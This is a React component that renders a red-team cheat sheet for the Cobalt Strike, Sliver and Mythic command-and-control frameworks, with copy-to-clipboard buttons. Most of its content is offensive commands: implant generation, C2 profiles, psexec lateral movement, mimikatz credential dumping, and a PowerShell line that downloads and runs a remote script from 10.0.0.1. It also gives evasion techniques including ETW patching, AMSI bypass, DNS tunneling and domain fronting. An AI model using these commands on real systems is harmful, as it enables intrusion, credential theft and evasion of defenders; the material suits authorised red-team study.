import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaServer, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const C2Frameworks = () => {
  const [expandedSection, setExpandedSection] = useState('cobalt');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'cobalt',
      title: 'Cobalt Strike',
      content: [
        {
          type: 'markdown',
          value: `### Team Server Setup
\`\`\`bash
# Start team server
./teamserver <IP> <PASSWORD> [/path/to/c2.profile]

# Common Malleable C2 profile options
http-get {
    set uri "/api/collect";
    client {
        header "Accept" "*/*";
        metadata {
            base64url;
            parameter "id";
        }
    }
    server {
        output {
            netbios;
            prepend "{\"data\":\"";
            append "\"}";
        }
    }
}
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Beacon Commands
\`\`\`powershell
# Common beacon commands
shell whoami /all
ls \\\\dc01\\c$
portscan 10.0.0.0/24 445,3389 arp 10
make_token CONTOSO\\admin P@ssw0rd
kerberos_ticket_use /path/to/ticket.kirbi

# Privilege escalation
elevate svc-exe smb
inject 4242 x64

# Lateral movement
psexec dc01 smb
jump psexec64 dc01 smb
\`\`\``
        }
      ]
    },
    {
      id: 'sliver',
      title: 'Sliver',
      content: [
        {
          type: 'markdown',
          value: `### Server Setup
\`\`\`bash
# Start server
sliver-server

# Generate implants
generate --mtls 10.0.0.1 --os windows --arch amd64 --save /tmp/ --format exe
generate --http https://10.0.0.1 --os linux --arch amd64 --format shared

# Listener
mtls --lhost 10.0.0.1 --lport 8888
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Implant Commands
\`\`\`bash
# Common commands
whoami
ls /tmp
execute -o /bin/ls -a /tmp
ps

# Privilege escalation
getsystem
bypassuac

# Pivoting
socks start 1080
portfwd add -b 127.0.0.1:3389 -r 10.0.0.10:3389
\`\`\``
        }
      ]
    },
    {
      id: 'mythic',
      title: 'Mythic',
      content: [
        {
          type: 'markdown',
          value: `### Agent Setup
\`\`\`bash
# Start Mythic
./start_mythic.sh

# Create Apollo agent
./apollo/mythic-cli payload create apollo -t windows -p '{"callback_host":"10.0.0.1","callback_port":80}'

# Listener
./apollo/mythic-cli listener create http -p '{"port":80,"host":"0.0.0.0"}'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Tasking
\`\`\`bash
# Common tasks
shell whoami /all
file_browser ./
process list

# Credential tasks
mimikatz sekurlsa::logonpasswords
vault list

# Lateral movement
psinject target.exe powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1')"
\`\`\``
        }
      ]
    },
    {
      id: 'opsec',
      title: 'OPSEC Considerations',
      content: [
        {
          type: 'markdown',
          value: `### Evasion Techniques
\`\`\`markdown
- **Sleep Masking**: Modify memory patterns during sleep
  - Cobalt: \`sleep_mask true\`
  - Sliver: \`set sleeptime 60 --jitter 20\`

- **Proxy Awareness**: 
  - Check for proxies before connecting
  - Use \`check_proxy\` command in Cobalt

- **ETW Patching**: Disable Event Tracing for Windows
  - \`patch etw\` in Cobalt
  - \`execute-assembly DisableETW.exe\`

- **AMSI Bypass**: 
  - \`amsi bypass\` in Sliver
  - \`execute-assembly AMSIBypass.dll\`
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Secure Communications
\`\`\`bash
# HTTPS with valid certificates
letsencrypt -d c2.domain.com

# DNS tunneling setup
dnscat2 --secret=mysecret --listen=0.0.0.0

# Domain Fronting
http-get {
    set uri "/api";
    client {
        header "Host" "cdn.amazonaws.com";
        metadata {
            netbios;
            prepend "session=";
            header "Cookie";
        }
    }
}
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaServer /> Command & Control Frameworks
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive guide to C2 frameworks including Cobalt Strike, Sliver, and Mythic.
          Covers setup, common commands, and OPSEC considerations for red team operations.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                          <button
                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
                            className="copy-button"
                          >
                            Copy All
                          </button>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default C2Frameworks;